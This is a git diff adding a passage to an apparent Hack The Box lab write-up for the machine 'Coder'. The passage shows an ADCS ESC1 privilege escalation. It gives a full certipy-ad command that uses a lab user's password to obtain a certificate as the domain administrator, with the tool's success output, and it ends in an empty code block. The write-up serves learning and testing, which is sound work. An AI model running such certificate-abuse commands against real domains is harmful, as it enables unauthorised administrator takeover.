@@ -1086,6 +1086,23 @@ And now ill use the cmd let from `ADCSTemplate.psm1` to create the new template 
 
 And now running certipy i see its vulnerable
 
+https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication
+
+```python
+❯❯❯ certipy-ad req -dc-ip 10.129.229.190 -dc-host dc01.coder.htb -target-ip 10.129.229.190 -target dc01.coder.htb -u e.black@coder.htb -p 'ypOSJXPqlDOxxbQSfEERy300' -ca 'coder-DC01-CA' -template 'ESC1' -upn 'administrator@coder.htb' -sid 'S-1-5-21-2608251805-3526430372-1546376444-500'
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 14
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@coder.htb'
+[*] Certificate object SID is 'S-1-5-21-2608251805-3526430372-1546376444-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+Then using the certipy wiki i can follow the steps
+
 ```python
 
 ```
